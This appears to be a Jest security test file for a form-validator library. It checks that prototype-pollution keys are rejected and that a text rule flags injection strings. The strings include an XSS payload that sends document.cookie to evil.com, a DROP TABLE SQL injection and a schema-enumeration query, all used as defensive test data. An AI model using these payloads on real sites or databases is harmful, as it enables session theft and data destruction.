/**
 * Project Name: Universal Form Builder (Validator Engine)
 * Author: Mayuresh Pandit
 * Description: Hard-level security penetration test suite.
 */

const { rules } = require('../src/rules');

describe('Hard-Level Security Penetration Tests', () => {

    test('resists prototype pollution via rule definitions', () => {
        // Standard built-in JS prototype keys that should be blocked
        const maliciousPayloads = ['__proto__', 'constructor', 'prototype'];

        maliciousPayloads.forEach(key => {
            expect(() => {
                rules.register(key, () => null);
            }).toThrow();
        });
    });

    test('sanitizes or flags advanced injection attempts safely in safeText rule', () => {
        const maliciousStrings = [
            '<script>fetch("http://evil.com?cookie=" + document.cookie)</script>',
            '"><script>alert(1)</script>',
            "'; DROP TABLE users; --",
            '1; SELECT * FROM information_schema.tables;'
        ];

        maliciousStrings.forEach(payload => {
            const error = rules.safeText(payload);
            expect(error).toBe('Invalid characters detected.');
        });
    });

});